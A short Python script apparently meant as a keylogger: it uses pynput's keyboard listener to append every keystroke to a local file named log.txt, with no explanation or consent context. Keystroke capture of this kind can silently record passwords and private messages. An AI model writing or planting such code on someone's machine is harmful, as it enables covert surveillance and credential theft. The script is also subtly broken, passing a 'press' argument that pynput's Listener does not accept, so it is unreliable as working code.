from pynput.keyboard import Key,Listener

def press(key):
	with open("log.txt","a")as f:
		f.write(str(key))
		
with Listener(press=press)as listener:
	listener.join()
